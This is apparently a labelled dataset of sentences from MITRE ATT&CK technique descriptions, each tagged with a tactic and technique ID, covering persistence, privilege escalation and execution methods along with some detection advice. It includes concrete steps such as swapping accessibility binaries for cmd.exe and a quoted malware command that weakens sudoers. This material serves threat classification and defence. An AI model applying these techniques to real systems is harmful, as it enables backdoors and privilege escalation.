"AppleScripts do not need to call osascript to execute, however.",TA0002,T1059.002
"They may be executed from within mach-O binaries by using the macOS Native APIs NSAppleScript or OSAScript, both of which execute code independent of the /usr/bin/osascript command line utility.",TA0002,T1059.002
"Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes.",TA0002,T1059.002
"These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely.",TA0002,T1059.002
"On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format.",TA0002,T1059.002

"Native API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.",TA0002,T1106
"For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes.",TA0002,T1106
"This may allow API callers to execute a binary, run a CLI command, load modules,  as thousands of similar API functions exist for various system operations.",TA0002,T1106
"Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs.",TA0002,T1106

Adversaries may abuse Internet browser extensions to establish persistent access to victim systems.,TA0003,T1176
Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers.,TA0003,T1176
They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.,TA0003,T1176
"Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system.",TA0003,T1176
Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.,TA0003,T1176
"Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.",TA0003,T1176
"Previous to macOS 11, adversaries could silently install browser extensions via the command line using the profiles tool to install malicious .mobileconfig files.",TA0003,T1176
"In macOS 11+, the use of the profiles tool can no longer install configuration profiles, however .mobileconfig files can be planted and installed with user interaction.",TA0003,T1176
"Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.",TA0003,T1176

"For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated.",TA0003,T1546.004
The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment.,TA0003,T1546.004
All login shells on a system use /etc/profile when initiated.,TA0003,T1546.004
"These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment.",TA0003,T1546.004

Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells.,TA0003,T1546.004
"Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files.",TA0003,T1546.004
These files typically require root permissions to modify and are executed each time any shell on a system launches.,TA0003,T1546.004
"For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely.",TA0003,T1546.004
"Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution.",TA0003,T1546.004

Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries.,TA0003,T1546.006
Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded.,TA0003,T1546.006
The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time.,TA0003,T1546.006
These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.,TA0003,T1546.006
There are tools available to perform these changes.,TA0003,T1546.006
Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed.,TA0003,T1546.006
"Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.",TA0003,T1546.006

Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs.,TA0003,T1546.007
Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system.,TA0003,T1546.007
It contains functionality to add helper DLLs for extending functionality of the utility.,TA0003,T1546.007
The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.,TA0003,T1546.007
Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner.,TA0003,T1546.007
"This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.",TA0003,T1546.007

Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features.,TA0003,T1546.008
Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen).,TA0003,T1546.008
An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.,TA0003,T1546.008
"Two common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed.",TA0003,T1546.008
"The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.",TA0003,T1546.008
"Depending on the version of Windows, an adversary may take advantage of these features in different ways.",TA0003,T1546.008
Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry.,TA0003,T1546.008
"In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection (WFP/WRP).",TA0003,T1546.008
The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.,TA0003,T1546.008
"For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (, C:\Windows\System32\utilman.exe) may be replaced with ""cmd.exe"" (or another program that provides backdoor access).",TA0003,T1546.008
"Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges.",TA0003,T1546.008
Other accessibility features exist that may also be leveraged in a similar fashion:,TA0003,T1546.008

There are several public tools available that will detect shims that are currently available :* Shim-Process-Scanner - checks memory of every running process for any shim flags* Shim-Detector-Lite - detects installation of custom shim databases* Shim-Guard - monitors registry for any shim installations* ShimScanner - forensic tool to find active shims in memory* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot),TA0003,T1546.011
Monitor for changes to windows registry keys and/or values that may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.,TA0003,T1546.011
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers.,TA0003,T1546.012
IFEOs enable a developer to attach a debugger to an application.,TA0003,T1546.012
"When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (, C:\dbg\ntsd.exe -g  notepad.exe).",TA0003,T1546.012
IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.,TA0003,T1546.012
IFEOs are represented as Debugger values in the Registry under HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ where <executable> is the binary on which the debugger is attached.,TA0003,T1546.012
"IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits ( is prematurely terminated by itself or a second, non kernel-mode process).",TA0003,T1546.012
"Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\.",TA0003,T1546.012
"Similar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe).",TA0003,T1546.012
"After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the ""debugger"" program to be executed with SYSTEM privileges.",TA0003,T1546.012
"Similar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.",TA0003,T1546.012
Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.,TA0003,T1546.012
Malware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.,TA0003,T1546.012

"Monitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles,",TA0003,T1546.012
Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles.,TA0003,T1546.013
A PowerShell profile  (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.,TA0003,T1546.013
PowerShell supports several profiles depending on the user or host program.,TA0003,T1546.013
"For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code.",TA0003,T1546.013
An administrator can also configure a profile that applies to all users and host programs on the local computer.,TA0003,T1546.013
"Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence.",TA0003,T1546.013
Every time a user opens a PowerShell session the modified script will be executed unless the -NoProfile flag is used when it is launched.,TA0003,T1546.013
"An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.",TA0003,T1546.013
Turla has used PowerShell profiles to maintain persistence on an infected machine.,TA0003,T1546.013
Enforce execution of only signed PowerShell scripts.,TA0003,T1546.013

Making PowerShell profiles immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence.,TA0003,T1546.013
Avoid PowerShell profiles if not needed.,TA0003,T1546.013
Use the -No Profile flag with when executing PowerShell scripts remotely to prevent local profiles and scripts from being executed.,TA0003,T1546.013
"Monitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules.",TA0003,T1546.013
Locations where profile.ps1 can be stored should be monitored for new profiles.,TA0003,T1546.013

Monitor newly executed processes that may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles.,TA0003,T1546.013
Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond).,TA0003,T1546.014
"Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action.",TA0003,T1546.014
The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.,TA0003,T1546.014
"The rule files are in the plist format and define the name, event type, and action to take.",TA0003,T1546.014
Some examples of event types include system startup and user authentication.,TA0003,T1546.014
Examples of actions are to run a system command or send an email.,TA0003,T1546.014
"The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the Launch Daemon configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist.",TA0003,T1546.014
"Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.",TA0003,T1546.014

Monitor newly executed processes that may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond).,TA0003,T1546.014
Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects.,TA0003,T1546.015
COM is a system within Windows to enable interaction between software components through the operating system.,TA0003,T1546.015
References to various COM objects are stored in the Registry.,TA0003,T1546.015
Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence.,TA0003,T1546.015
Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed.,TA0003,T1546.015
When that system component is executed through normal system operation the adversary's code will be executed instead.,TA0003,T1546.015
"An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",TA0003,T1546.015
Some variants of ADVSTORESHELL achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.,TA0003,T1546.015

Monitor newly executed processes that may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects.,TA0003,T1546.015
There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: Reg) replacing known binary paths with unknown paths or otherwise malicious content.,TA0003,T1546.015
"Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\Software\Classes\CLSID\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID.",TA0003,T1546.015
Registry entries for existing COM objects may change infrequently.,TA0003,T1546.015
"When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.",TA0003,T1546.015
Adversaries may leverage external-facing remote services to initially access and/or persist within a network.,TA0003,T1133
"Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations.",TA0003,T1133
There are often remote service gateways that manage connections and credential authentication for these services.,TA0003,T1133
Services such as Windows Remote Management and VNC can also be used externally.,TA0003,T1133
"Access to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.",TA0003,T1133
Access to remote services may be used as a redundant or persistent access mechanism during an operation.,TA0003,T1133
Access may also be gained through an exposed service that doesn’t require authentication.,TA0003,T1133

"Monitor newly constructed processes for unusual activity (, a process that does not use the network begins to do so) as well as the introduction of new files/programs.",TA0003,T1574.002
Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime.,TA0003,T1574.004
The dynamic loader will try to find the dylibs based on the sequential order of the search paths.,TA0003,T1574.004
"Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.",TA0003,T1574.004
"Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present.",TA0003,T1574.004
Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.,TA0003,T1574.004
Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.,TA0003,T1574.004

Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer.,TA0003,T1574.005
These processes may automatically execute specific binaries as part of their functionality or to perform other actions.,TA0003,T1574.005
"If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process.",TA0003,T1574.005
"If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.",TA0003,T1574.005
"Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers.",TA0003,T1574.005
"During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads.",TA0003,T1574.005
"When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process.",TA0003,T1574.005
This behavior is related to and may take advantage of DLL Search Order Hijacking.,TA0003,T1574.005
Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level.,TA0003,T1574.005
Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code.,TA0003,T1574.005
This behavior is related to Bypass User Account Control.,TA0003,T1574.005
Several examples of this weakness in existing common installers have been reported to software vendors.,TA0003,T1574.005

Monitor for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.,TA0003,T1574.005
Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries.,TA0003,T1574.006
"During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS.",TA0003,T1574.006
"Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.",TA0003,T1574.006
"These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.",TA0003,T1574.006
"On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",TA0003,T1574.006
This method may also evade detection from security products since the execution is masked under a legitimate process.,TA0003,T1574.006
"Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function.",TA0003,T1574.006
Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python’s os.environ.,TA0003,T1574.006
"On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program.",TA0003,T1574.006
LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file.,TA0003,T1574.006
Libraries specified by LD_PRELOAD are loaded and mapped into memory by dlopen() and mmap() respectively.,TA0003,T1574.006
"On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level.",TA0003,T1574.006

"Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.",TA0003,T1574.007
The PATH environment variable contains a list of directories.,TA0003,T1574.007
Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given.,TA0003,T1574.007
"If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\system32 (, C:\Windows\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.",TA0003,T1574.007
"For example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",TA0003,T1574.007

Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs.,TA0003,T1574.008
"Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.",TA0003,T1574.008
Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path.,TA0003,T1574.008
"Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program.",TA0003,T1574.008
"However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory.",TA0003,T1574.008

Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR.,TA0003,T1574.012
The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR).,TA0003,T1574.012
"These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.",TA0003,T1574.012
"The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence.",TA0003,T1574.012
"System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL.",TA0003,T1574.012
A process scope COR_PROFILER can also be created in-memory without modifying the Registry.,TA0003,T1574.012
"Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.",TA0003,T1574.012
Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked.,TA0003,T1574.012
"The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.",TA0003,T1574.012
Blue Mockingbird has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.,TA0003,T1574.012

Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads.,TA0003,T1574.013
The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.,TA0003,T1574.013
An adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload.,TA0003,T1574.013
Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.,TA0003,T1574.013
A pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function).,TA0003,T1574.013
"Once the pointer is located, the KernelCallbackTable can be duplicated, and a function in the table (, fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()).",TA0003,T1574.013
The PEB is then updated with the new address of the table.,TA0003,T1574.013
"Once the tampered function is invoked, the malicious payload will be triggered.",TA0003,T1574.013
The tampered function is typically invoked using a Windows message.,TA0003,T1574.013
"After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload.",TA0003,T1574.013
Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.,TA0003,T1574.013
FinFisher has used the KernelCallbackTable to hijack the execution flow of a process by replacing the __fnDWORD function with the address of a created Asynchronous Procedure Call stub routine.,TA0003,T1574.013
Lazarus Group has abused the KernelCallbackTable to hijack process control flow and execute shellcode.,TA0003,T1574.013
Some endpoint security solutions can be configured to block some types of behaviors related to process injection/memory tampering based on common sequences of indicators (ex: execution of specific API functions).,TA0003,T1574.013

Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control.,TA0003,T1205
"Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task.",TA0003,T1205
This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control.,TA0003,T1205
"Usually this series of packets consists of attempted connections to a predefined sequence of closed ports ( Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics.",TA0003,T1205

"One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question.",TA0003,T1205
"Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",TA0003,T1205
"On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.",TA0003,T1205

"This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password.",TA0004,T1548.003
"However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL.",TA0004,T1548.003
Elevated privileges are required to edit this file though.,TA0004,T1548.003
Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password.,TA0004,T1548.003
"For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range.",TA0004,T1548.003
"If it does, then malware can execute sudo commands without needing to supply the user's password.",TA0004,T1548.003
"Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.",TA0004,T1548.003
"In the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \'Defaults !tty_tickets\' >> /etc/sudoers.",TA0004,T1548.003
"In order for this change to be reflected, the malware also issued killall Terminal.",TA0004,T1548.003

Proton modifies the tty_tickets line in the sudoers file.,TA0004,T1548.003
Ensuring that the tty_tickets setting is enabled will prevent this leakage across tty sessions.,TA0004,T1548.003
"By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file.",TA0004,T1548.003
Setting the timestamp_timeout to 0 will require the user to input their password every time sudo is executed.,TA0004,T1548.003
The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege.,TA0004,T1548.003

"Monitor contextual data about a running process, which may include information such as environment variables, image name, user/owner that may perform sudo caching and/or use the suoders file to elevate privileges.",TA0004,T1548.003
Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.,TA0004,T1548.004
"The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.",TA0004,T1548.004
This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.,TA0004,T1548.004
"Although this API is deprecated, it still fully functions in the latest releases of macOS.",TA0004,T1548.004
"When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made.",TA0004,T1548.004
The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.,TA0004,T1548.004
Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.,TA0004,T1548.004
This technique may be combined with Masquerading to trick the user into granting escalated privileges to malicious code.,TA0004,T1548.004
This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.,TA0004,T1548.004
OSX/Shlayer can escalate privileges to root by asking the user for credentials.,TA0004,T1548.004
System settings can prevent applications from running that haven't been downloaded through the Apple Store which may help mitigate some of these issues.,TA0004,T1548.004
Not allowing unsigned applications from being run may also mitigate some risk.,TA0004,T1548.004
Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.,TA0004,T1548.004
Consider monitoring for /usr/libexec/security_authtrampoline executions which may indicate that AuthorizationExecuteWithPrivileges is being executed.,TA0004,T1548.004
MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called.,TA0004,T1548.004
Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls.,TA0004,T1134
Windows uses access tokens to determine the ownership of a running process.,TA0004,T1134
A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process.,TA0004,T1134
"When this occurs, the process also takes on the security context associated with the new token.",TA0004,T1134
An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing.,TA0004,T1134
These token can then be applied to an existing process ( Token Impersonation/Theft) or used to spawn a new process ( Create Process with Token).,TA0004,T1134
An adversary must already be in a privileged user context ( administrator) to steal a token.,TA0004,T1134
"However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level.",TA0004,T1134
An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.,TA0004,T1134
"Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.",TA0004,T1134
"There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",TA0004,T1134
AppleSeed can gain system level privilege by passing SeDebugPrivilege to the AdjustTokenPrivilege API.,TA0004,T1134

User Unix Shells execute several configuration scripts at different points throughout the session based on events.,TA0004,T1546.004
"For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated.",TA0004,T1546.004
The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment.,TA0004,T1546.004
All login shells on a system use /etc/profile when initiated.,TA0004,T1546.004
"These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment.",TA0004,T1546.004

Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells.,TA0004,T1546.004
"Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files.",TA0004,T1546.004
These files typically require root permissions to modify and are executed each time any shell on a system launches.,TA0004,T1546.004
"For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely.",TA0004,T1546.004
"Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution.",TA0004,T1546.004

The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals.,TA0004,T1546.005
A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.,TA0004,T1546.005
Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism.,TA0004,T1546.005

Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries.,TA0004,T1546.006
Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded.,TA0004,T1546.006
The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time.,TA0004,T1546.006
These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.,TA0004,T1546.006
There are tools available to perform these changes.,TA0004,T1546.006
Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed.,TA0004,T1546.006
"Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.",TA0004,T1546.006

Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs.,TA0004,T1546.007
Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system.,TA0004,T1546.007
It contains functionality to add helper DLLs for extending functionality of the utility.,TA0004,T1546.007
The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.,TA0004,T1546.007
Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner.,TA0004,T1546.007
"This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.",TA0004,T1546.007

Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features.,TA0004,T1546.008
Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen).,TA0004,T1546.008
An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.,TA0004,T1546.008
"Two common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed.",TA0004,T1546.008
"The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.",TA0004,T1546.008
"Depending on the version of Windows, an adversary may take advantage of these features in different ways.",TA0004,T1546.008
Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry.,TA0004,T1546.008
"In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection (WFP/WRP).",TA0004,T1546.008
The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.,TA0004,T1546.008
"For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (, C:\Windows\System32\utilman.exe) may be replaced with ""cmd.exe"" (or another program that provides backdoor access).",TA0004,T1546.008
"Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges.",TA0004,T1546.008
Other accessibility features exist that may also be leveraged in a similar fashion:,TA0004,T1546.008

